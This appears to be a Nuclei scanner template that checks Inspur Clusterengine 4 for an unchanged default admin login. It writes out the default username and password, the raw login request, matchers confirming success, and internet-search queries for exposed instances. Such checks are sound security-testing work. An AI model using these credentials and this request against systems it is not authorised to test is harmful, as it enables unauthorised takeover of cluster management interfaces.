id: inspur-clusterengine-default-login

info:
  name: Inspur Clusterengine 4 - Default Admin Login
  author: ritikchaddha
  severity: high
  description: |
    Inspur Clusterengine default admin credentials were discovered.
  reference:
    - https://blog.csdn.net/qq_36197704/article/details/115665793
  classification:
    cpe: cpe:2.3:a:inspur:clusterengine:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: inspur
    product: clusterengine
    fofa-query: title="tscev4.0"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)TSCEV4\\.0"})
  tags: default-login,inspur,clusterengine

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}

        op=login&username={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin|pwd
      password:
        - 123456
    host-redirects: true
    max-redirects: 2

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"exitcode":0'

      - type: word
        part: header
        words:
          - "username=admin|pwd"
        condition: and

      - type: status
        status:
          - 200

